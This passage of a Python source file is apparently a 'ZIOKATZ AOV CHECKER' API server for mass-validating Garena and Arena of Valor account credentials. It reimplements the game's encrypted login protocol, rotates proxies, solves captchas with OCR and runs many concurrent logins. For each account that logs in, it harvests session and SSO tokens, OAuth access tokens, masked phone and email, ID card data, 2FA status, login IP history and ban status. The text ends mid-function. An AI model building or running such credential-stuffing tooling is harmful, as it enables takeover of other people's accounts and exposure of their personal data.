#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZIOKATZ AOV CHECKER - API Server
Exposes /check endpoint for account validation.
Usage: python app.py
"""

import os
import sys
import time
import re
import random
import socket
import struct
import hashlib
import uuid
import threading
import json
import unicodedata
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO

# ======================= THƯ VIỆN HỖ TRỢ ====================================
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import cv2
    import numpy as np
except ImportError:
    cv2 = None
    np = None

try:
    from PIL import Image, ImageFilter
except ImportError:
    Image = None
    ImageFilter = None

try:
    import ddddocr
except ImportError:
    ddddocr = None

# ======================= MÀU SẮC ===========================================
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    C = Fore
    S = Style
    if not hasattr(C, 'GRAY'):
        C.GRAY = '\033[90m'
    def _c(color, text):
        return f"{color}{text}{S.RESET_ALL}"
except ImportError:
    C = type('obj', (object,), {
        'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
        'BLUE': '\033[94m', 'MAGENTA': '\033[95m', 'CYAN': '\033[96m',
        'WHITE': '\033[97m', 'GRAY': '\033[90m', 'RESET': '\033[0m', 'BOLD': '\033[1m'
    })
    S = type('obj', (object,), {'RESET_ALL': '\033[0m', 'BRIGHT': '\033[1m'})
    def _c(color, text):
        return f"{color}{text}{S.RESET_ALL}"

# ======================= HẰNG SỐ GIAO THỨC ================================
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION          = 283
CLIENT_TYPE             = 4352
CMD_LOGIN_PREPARE       = 256
CMD_LOGIN               = 257
CMD_LOGIN_INFO_GET      = 276
CMD_SESSION_TOKEN_GET   = 278
CMD_USER_BASIC_INFO_LIST_GET = 289
CMD_USER_FULL_INFO_LIST_GET  = 291
CMD_USER_GPP_INFO_LIST_GET   = 337
CMD_USER_ACCOUNT_INFO_GET    = 342
CMD_SSO_KEY_GET         = 442
CMD_APP_OAUTH_LOGIN     = 439
CMD_FB_USER_INFO_GET    = 467
CMD_C2S_REQUEST         = 2
LIEN_QUAN_APP_ID        = 100054
ROV_TH_APP_ID           = 100055
FC_MOBILE_VN_APP_ID     = 100155
DF_GARENA_CLIENT_ID     = 100151
PACKET_VERSION          = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION

CLIENT_ID_MASK = 4354
_pkt_counter   = random.randint(0, 0x3FFFFF)

_MAX_CONN = 100
_conn_sem = threading.Semaphore(_MAX_CONN)

_proxy_list = []
_proxy_idx = 0
_proxy_lock = threading.Lock()
_proxy_type_cache = {}
_proxy_type_lock = threading.Lock()
_save_lock = threading.Lock()
_print_lock = threading.Lock()

_HOST_IP = None
_HOST_IP_lock = threading.Lock()

# ======================= XTEA =============================================
_XTEA_DELTA  = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v):
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0, v1, key):
    k = struct.unpack('<4I', key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0, v1, key):
    k = struct.unpack('<4I', key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data, key):
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack('<Q', os.urandom(8))[0]
    R_bytes = struct.pack('<Q', R)
    enc_R = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', R_bytes), key))
    prev = enc_R
    out = bytearray(enc_R)
    pt_sum = R
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1)
        last_ct = prev
        out.extend(prev)
    last_ct_val = struct.unpack('<Q', last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack('<Q', check_input)
    check_enc = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', check_bytes), key))
    out.extend(check_enc)
    return bytes(out)

def xtea_decrypt(data, key):
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv = data[:8]
    body = data[8:-8]
    out = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i+8]
        v0, v1 = _xtea_dec_block(*struct.unpack('<2I', blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev))
        out.extend(plain)
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

# ======================= PROTOBUF =========================================
def _varint_enc(n):
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag, n):
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag, b):
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag, s):
    return _pf_bytes(tag, s.encode('utf-8'))

def _proto_decode(data):
    fields = {}
    pos = 0
    while pos < len(data):
        try:
            key = 0; shift = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80): break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = val
            elif wt == 2:
                ln = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = data[pos:pos+ln]
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields

# ======================= SOCKET / FRAME ===================================
def _next_id():
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

def _build_frame(cmd, body):
    hdr = (
        _pf_varint(1, PACKET_VERSION) +
        _pf_varint(2, _next_id()) +
        _pf_varint(3, CMD_C2S_REQUEST) +
        _pf_varint(4, cmd) +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(payload)) + payload

def _recvall(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection dropped")
        buf += chunk
    return buf

def _recv_frame(sock):
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    payload = _recvall(sock, size)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr = _proto_decode(payload[2:2+hdr_len])
    body = payload[2+hdr_len:]
    return hdr, body

def _recv_cmd_frame(sock, target_cmd, max_tries=5):
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock)
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return {5: -1}, b''

def _build_enc_frame(cmd, body, session_key):
    hdr = (
        _pf_varint(1, PACKET_VERSION) +
        _pf_varint(2, _next_id()) +
        _pf_varint(3, CMD_C2S_REQUEST) +
        _pf_varint(4, cmd) +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    enc_payload = xtea_encrypt(payload, session_key)
    return struct.pack('<I', len(enc_payload)) + enc_payload

def _recv_enc_frame(sock, session_key):
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    enc_payload = _recvall(sock, size)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr = _proto_decode(payload[2:2+hdr_len])
    body = payload[2+hdr_len:]
    return hdr, body

def _send_cmd(sock, cmd, body, session_key, max_tries=5):
    sock.sendall(_build_enc_frame(cmd, body, session_key))
    for _ in range(max_tries):
        hdr, resp_body = _recv_enc_frame(sock, session_key)
        if hdr.get(4, 0) == cmd:
            return hdr, resp_body
    return {5: -1}, b''

# ======================= PROXY ============================================
def _make_fast_socket(timeout=20):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)
    return sock

def _resolve_host_ip(timeout=5):
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    with _HOST_IP_lock:
        if _HOST_IP:
            return _HOST_IP
        candidate_ips = []
        try:
            infos = socket.getaddrinfo(HOST, PORT, socket.AF_INET, socket.SOCK_STREAM)
            for info in infos:
                ip = info[4][0]
                if ip not in candidate_ips:
                    candidate_ips.append(ip)
        except Exception:
            pass
        known_pool = [f"103.247.205.{i}" for i in range(14, 25)]
        for ip in known_pool:
            if ip not in candidate_ips:
                candidate_ips.append(ip)
        for ip in candidate_ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue
        try:
            _HOST_IP = socket.gethostbyname(HOST)
        except Exception:
            _HOST_IP = HOST
        return _HOST_IP

def load_proxies(filepath):
    global _proxy_list
    proxies = []
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(':')
            if len(parts) >= 4:
                proxies.append((parts[0], int(parts[1]), parts[2], parts[3]))
            elif len(parts) >= 2:
                proxies.append((parts[0], int(parts[1]), None, None))
    _proxy_list = proxies

def _next_proxy():
    global _proxy_idx
    if not _proxy_list:
        return None
    with _proxy_lock:
        p = _proxy_list[_proxy_idx % len(_proxy_list)]
        _proxy_idx += 1
    return p

def _get_http_proxies(proxy):
    if not proxy:
        return None
    ip, port, user, pw = proxy
    ptype = _proxy_type_cache.get((ip, port), 'socks5')
    if ptype == 'socks5':
        if user and pw:
            url = f"socks5://{user}:{pw}@{ip}:{port}"
        else:
            url = f"socks5://{ip}:{port}"
    else:
        if user and pw:
            url = f"http://{user}:{pw}@{ip}:{port}"
        else:
            url = f"http://{ip}:{port}"
    return {"http": url, "https": url}

def _connect_via_socks5(sock, dest_host, dest_port, user=None, pw=None):
    if user and pw:
        sock.sendall(b'\x05\x02\x00\x02')
    else:
        sock.sendall(b'\x05\x01\x00')
    resp = b''
    while len(resp) < 2:
        chunk = sock.recv(2)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during greeting")
        resp += chunk
    if resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid version: {resp[0]}")
    method = resp[1]
    if method == 0xFF:
        raise ConnectionError("SOCKS5 no acceptable auth method")
    if method == 2:
        if not (user and pw):
            raise ConnectionError("SOCKS5 proxy requires auth but no credentials provided")
        u = user.encode('utf-8')
        p = pw.encode('utf-8')
        auth_req = bytes([1, len(u)]) + u + bytes([len(p)]) + p
        sock.sendall(auth_req)
        auth_resp = b''
        while len(auth_resp) < 2:
            chunk = sock.recv(2)
            if not chunk:
                raise ConnectionError("SOCKS5 proxy closed during auth")
            auth_resp += chunk
        if auth_resp[1] != 0:
            raise ConnectionError(f"SOCKS5 auth failed: status={auth_resp[1]}")
    elif method != 0:
        raise ConnectionError(f"SOCKS5 unsupported method: {method}")
    host_enc = dest_host.encode('utf-8')
    req = (b'\x05\x01\x00\x03' +
           bytes([len(host_enc)]) + host_enc +
           struct.pack('>H', dest_port))
    sock.sendall(req)
    conn_resp = b''
    while len(conn_resp) < 10:
        chunk = sock.recv(10)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during connect")
        conn_resp += chunk
    if conn_resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid response version: {conn_resp[0]}")
    if conn_resp[1] != 0:
        errors = {
            1: 'general failure', 2: 'connection not allowed', 3: 'network unreachable',
            4: 'host unreachable', 5: 'connection refused', 6: 'TTL expired',
            7: 'command not supported', 8: 'address type not supported',
        }
        raise ConnectionError(f"SOCKS5 connect error: {errors.get(conn_resp[1], conn_resp[1])}")

def _connect_via_proxy(proxy, dest_host, dest_port, timeout=20):
    import base64
    ip, port, user, pw = proxy
    key = (ip, port)
    cached_type = _proxy_type_cache.get(key)

    def _try_socks5():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        _connect_via_socks5(s, dest_host, dest_port, user, pw)
        return s

    def _try_http_connect():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        connect_line = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\n"
        if user and pw:
            cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
            connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
        connect_line += "\r\n"
        s.sendall(connect_line.encode())
        resp = b''
        while b'\r\n\r\n' not in resp:
            chunk = s.recv(4096)
            if not chunk:
                raise ConnectionError("Proxy closed connection")
            resp += chunk
        status_line = resp.split(b'\r\n')[0].decode(errors='replace')
        if '200' not in status_line:
            s.close()
            raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
        return s

    if cached_type == 'socks5':
        return _try_socks5()
    if cached_type == 'http':
        return _try_http_connect()
    try:
        s = _try_socks5()
        with _proxy_type_lock:
            _proxy_type_cache[key] = 'socks5'
        return s
    except Exception:
        pass
    s = _try_http_connect()
    with _proxy_type_lock:
        _proxy_type_cache[key] = 'http'
    return s

# ======================= LOGIN MESSAGES ===================================
def _account_type(account):
    if account.isdigit():
        return 3
    if '@' in account:
        return 2
    try:
        int(account)
        return 0
    except ValueError:
        return 1

def _build_login_prepare(account, rand_key, captcha_key="", captcha=""):
    inner = (
        _pf_varint(1, 0) +
        _pf_varint(2, _account_type(account)) +
        _pf_str(3, account) +
        _pf_varint(4, CLIENT_TYPE) +
        _pf_varint(5, CLIENT_VERSION)
    )
    if captcha_key:
        inner += _pf_str(7, captcha_key)
    if captcha:
        inner += _pf_str(8, captcha)
    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)

def _solve_garena_captcha(proxy_dict=None):
    if ddddocr is None:
        return "", ""
    captcha_key = str(uuid.uuid4()).replace("-", "")
    url = f"http://captcha.garena.com/image?key={captcha_key}"
    try:
        resp = requests.get(url, proxies=proxy_dict, timeout=5, verify=False)
        if resp.status_code != 200:
            return "", ""
        content = resp.content
        if cv2 is not None and np is not None:
            try:
                from collections import Counter
                nparr = np.frombuffer(content, np.uint8)
                img_color = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                img_color = cv2.resize(img_color, (0,0), fx=3, fy=3, interpolation=cv2.INTER_CUBIC)
                img_gray = cv2.cvtColor(img_color, cv2.COLOR_BGR2GRAY)
                ocr = ddddocr.DdddOcr(show_ad=False, beta=True)
                results = []
                _, buf1 = cv2.imencode('.png', img_color)
                r1 = ocr.classification(buf1.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r1.upper()))
                hsv = cv2.cvtColor(img_color, cv2.COLOR_BGR2HSV)
                mask = cv2.inRange(hsv, np.array([90,50,50]), np.array([130,255,255]))
                final2 = cv2.bitwise_not(mask)
                _, buf2 = cv2.imencode('.png', final2)
                r2 = ocr.classification(buf2.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r2.upper()))
                blur = cv2.GaussianBlur(img_gray, (3,3), 0)
                thresh3 = cv2.adaptiveThreshold(blur, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
                                                cv2.THRESH_BINARY_INV, 15, 6)
                final3 = cv2.bitwise_not(thresh3)
                _, buf3 = cv2.imencode('.png', final3)
                r3 = ocr.classification(buf3.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r3.upper()))
                _, thresh4 = cv2.threshold(img_gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)
                final4 = cv2.bitwise_not(thresh4)
                _, buf4 = cv2.imencode('.png', final4)
                r4 = ocr.classification(buf4.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r4.upper()))
                valid = [r for r in results if len(r) >= 5]
                if valid:
                    res = Counter(valid).most_common(1)[0][0]
                else:
                    res = Counter(results).most_common(1)[0][0]
                return captcha_key, res
            except Exception:
                pass
        if Image is not None:
            try:
                img = Image.open(BytesIO(content)).convert('L')
                img = img.filter(ImageFilter.MedianFilter(size=3))
                img = img.point(lambda p: 0 if p < 140 else 255)
                buf = BytesIO()
                img.save(buf, format='PNG')
                content = buf.getvalue()
            except Exception:
                pass
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification(content)
        if res:
            res = re.sub(r'[^A-Z0-9]', '', res.upper())
        return captcha_key, res
    except Exception:
        return "", ""

def _derive_login_key(password, salt, verify_code):
    md5hex = hashlib.md5(password.encode('utf-8')).hexdigest()
    inner_raw = hashlib.sha256((md5hex + salt).encode('utf-8')).digest()
    inner_hex = inner_raw.hex()
    xtea_key = hashlib.sha256((inner_hex + verify_code).encode('utf-8')).digest()[:16]
    pw_hash = md5hex.encode('ascii')
    return xtea_key, pw_hash

def _build_login(account, password, salt, verify_code):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    user_status_bytes = _pf_varint(2, 4608)
    device_id = os.urandom(16)
    inner = (
        _pf_bytes(1, pw_hash) +
        _pf_varint(2, 0) +
        _pf_bytes(3, user_status_bytes) +
        _pf_bytes(4, device_id)
    )
    enc = xtea_encrypt(inner, xtea_key)
    body = _pf_bytes(1, enc)
    return body, xtea_key

# ======================= POST-LOGIN FETCH =================================
def _fetch_login_info(sock, session_key):
    try:
        hdr, body = _send_cmd(sock, CMD_LOGIN_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 14 in fields:
            info['region'] = fields[14].decode('utf-8') if isinstance(fields[14], bytes) else str(fields[14])
        if 15 in fields:
            info['ccu'] = fields[15]
        if 13 in fields:
            acc = _proto_decode(fields[13]) if isinstance(fields[13], bytes) else {}
            if 1 in acc: info['shells'] = acc[1]
            if 2 in acc: info['topup_time'] = acc[2]
        if 4 in fields: info['created_time'] = fields[4]
        if 5 in fields: info['last_login'] = fields[5]
        if 2 in fields: info['session_expiry'] = fields[2]
        if 17 in fields:
            fb_proto = _proto_decode(fields[17]) if isinstance(fields[17], bytes) else {}
            if 1 in fb_proto:
                fb_uid_raw = fb_proto[1]
                info['fb_uid_login'] = fb_uid_raw.decode('utf-8') if isinstance(fb_uid_raw, bytes) else str(fb_uid_raw)
            if 2 in fb_proto:
                info['fb_link_time'] = fb_proto[2]
        if 18 in fields:
            s18 = _proto_decode(fields[18]) if isinstance(fields[18], bytes) else {}
            if 2 in s18: info['last_session_time'] = s18[2]
            if 3 in s18:
                ip_proto = _proto_decode(s18[3]) if isinstance(s18[3], bytes) else {}
                if 2 in ip_proto:
                    ip_raw = ip_proto[2]
                    info['last_session_ip'] = ip_raw.decode('utf-8') if isinstance(ip_raw, bytes) else str(ip_raw)
                if 3 in ip_proto:
                    cc_raw = ip_proto[3]
                    info['last_session_country'] = cc_raw.decode('utf-8') if isinstance(cc_raw, bytes) else str(cc_raw)
        return info
    except Exception:
        return {}

def _fetch_user_basic(sock, uid, session_key):
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(sock, CMD_USER_BASIC_INFO_LIST_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        if 1 not in fields:
            return {}
        user_data = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
        info = {}
        if 2 in user_data:
            info['uid'] = user_data[2]
        if 3 in user_data:
            info['username'] = user_data[3].decode('utf-8') if isinstance(user_data[3], bytes) else str(user_data[3])
        if 4 in user_data:
            info['nickname'] = user_data[4].decode('utf-8') if isinstance(user_data[4], bytes) else str(user_data[4])
        return info
    except Exception:
        return {}

def _fetch_account_info(sock, session_key):
    try:
        hdr, body = _send_cmd(sock, CMD_USER_ACCOUNT_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 4 in fields: info['password_set'] = bool(fields[4])
        if 5 in fields: info['email_verified'] = bool(fields[5])
        if 6 in fields: info['account_secured'] = bool(fields[6])
        if 7 in fields: info['mobile_bound'] = bool(fields[7])
        return info
    except Exception:
        return {}

def _fetch_sso_key(sock, session_key):
    try:
        hdr, body = _send_cmd(sock, CMD_SSO_KEY_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 1 in fields:
            info['sso_key'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_session_token(sock, session_key):
    try:
        body = b''
        hdr, resp = _send_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['session_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_fb_info(sock, session_key):
    try:
        body = _pf_str(1, "")
        hdr, resp = _send_cmd(sock, CMD_FB_USER_INFO_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {'fb_linked': False}
        fields = _proto_decode(resp)
        if 1 in fields:
            fb = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
            fb_uid = fb.get(4, 0)
            if fb_uid:
                return {'fb_linked': True, 'fb_uid': fb_uid}
        return {'fb_linked': False}
    except Exception:
        return {'fb_linked': False}

def _fetch_oauth_token(sock, session_key, app_id, response_type=2):
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, response_type) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['access_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 4 in fields:
            info['open_id'] = fields[4].decode('utf-8') if isinstance(fields[4], bytes) else str(fields[4])
        return info
    except Exception:
        return {}

def _fetch_recent_games(session_token, proxy=None):
    if not requests or not session_token:
        return {}
    try:
        url = f"https://garenaapp.garenanow.com/api/user/get_recent_games?session_key={session_token}"
        resp = requests.get(url, timeout=5, verify=False, proxies=_get_http_proxies(proxy))
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                return data
    except Exception:
        pass
    return {}

def _fetch_aov_user_info(access_token, region="VN", proxy=None):
    if not requests or not access_token:
        return {}
    try:
        params = {"app_id": str(LIEN_QUAN_APP_ID), "region": region or "VN", "access_token": access_token}
        resp = requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params,
            verify=False,
            timeout=5,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def _fetch_account_security(sso_key, proxy=None):
    if not requests or not sso_key:
        return {}
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        ua = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False, timeout=8, allow_redirects=False,
        )
        if resp.status_code != 200:
            return {}
        resp2 = sess.get(
            "https://account.garena.com/api/account/init",
            headers={"User-Agent": ua},
            verify=False, timeout=8,
        )
        if resp2.status_code != 200:
            return {}
        data = resp2.json()
        if "error" in data:
            return {}
        ui = data.get("user_info", {})
        info = {}
        phone = ui.get("mobile_no", "")
        cc = ui.get("country_code", "")
        if phone and phone.replace("*", ""):
            info["masked_phone"] = f"+{cc} {phone}" if cc else phone
        info["masked_email"] = ui.get("email", "")
        info["email_v"] = ui.get("email_v", 0)
        info["idcard"] = ui.get("idcard", "")
        
        info["authenticator_enable"] = ui.get("authenticator_enable", ui.get("authenticator", 0))
        info["two_step_verify"] = ui.get("two_step_verify_enable", ui.get("two_step_verify", 0))
        
        info["fb_connected"] = bool(ui.get("is_fbconnect_enabled"))
        info["fb_account"] = ui.get("fb_account")
        info["acc_country"] = ui.get("acc_country") or ""
        info["country"] = ui.get("country") or ""
        info["country_code"] = ui.get("country_code") or ""
        info["suspicious"] = 1 if ui.get("suspicious") else 0
        info["init_ip"] = data.get("init_ip", "")
        raw_hist = data.get("login_history") or []
        hist = []
        import datetime as _dt
        for h in raw_hist[:5]:
            ts = int(h.get("timestamp", 0) or h.get("login_time", 0) or 0)
            dt_str = _dt.datetime.fromtimestamp(ts).strftime('%d-%m-%Y %H:%M') if ts else ''
            hist.append({
                "ip":      h.get("ip", ""),
                "country": h.get("country", ""),
                "game":    h.get("source", "") or h.get("game_name", "") or h.get("app_name", ""),
                "time":    dt_str,
            })
        info["login_history"] = hist
        raw_ops = data.get("sensitive_operation") or []
        ops = []
        for op in raw_ops[:5]:
            ts = int(op.get("timestamp", 0) or op.get("operation_time", 0) or op.get("op_time", 0) or 0)
            dt_str = _dt.datetime.fromtimestamp(ts).strftime('%d-%m-%Y %H:%M') if ts else ''
            ops.append({
                "type": op.get("operation", "") or op.get("operation_type", "") or op.get("op_type", ""),
                "ip":   op.get("ip", ""),
                "time": dt_str,
            })
        info["sensitive_ops"] = ops
        return info
    except Exception:
        return {}

def _fetch_uac_country(sso_key, proxy=None):
    if not requests or not sso_key:
        return ""
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.cookies.set('sso_key', sso_key)
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_resp = sess.post(token_url, headers=token_headers, data=token_data, timeout=5, verify=False)
        access_token = token_resp.json().get('access_token')
        if access_token:
            inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
            inspect_resp = sess.post(inspect_url, json={'token': access_token}, timeout=5, verify=False)
            uac = inspect_resp.json().get('uac')
            if uac:
                return str(uac).strip().upper()
    except Exception:
        pass
    return ""

def _fetch_kientuong_player(sock, session_key, proxy=None):
    if not requests:
        return {}
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, "https://kientuong.lienquan.garena.vn/auth/login/callback") +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        redirect = fields[2].decode('utf-8') if 2 in fields else ''
        if not redirect:
            return {}
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect, allow_redirects=False, verify=False, timeout=5)
        if not sess.cookies:
            return {}
        resp2 = sess.get("https://kientuong.lienquan.garena.vn/api/player/get",
                         verify=False, timeout=5)
        if resp2.status_code == 200:
            player = resp2.json().get('player', {})
            import datetime
            reg_ts = player.get('registerTime')
            reg_str = datetime.datetime.fromtimestamp(reg_ts).strftime('%H:%M:%S %d-%m-%Y') if reg_ts else ''
            rep = player.get('creditScore') or player.get('behaviorPoint') or player.get('reputation')
            ban_payload = [
                player.get('banInfo'),
                player.get('punishInfo'),
                player.get('punishment'),
                {
                    'isBan': player.get('isBan'),
                    'isBanned': player.get('isBanned'),
                    'banned': player.get('banned'),
                    'ban': player.get('ban'),
                    'banStatus': player.get('banStatus'),
                    'status': player.get('status'),
                    'state': player.get('state'),
                    'endTime': player.get('endTime'),
                    'banEndTime': player.get('banEndTime'),
                    'unbanTime': player.get('unbanTime'),
                    'expireAt': player.get('expireAt'),
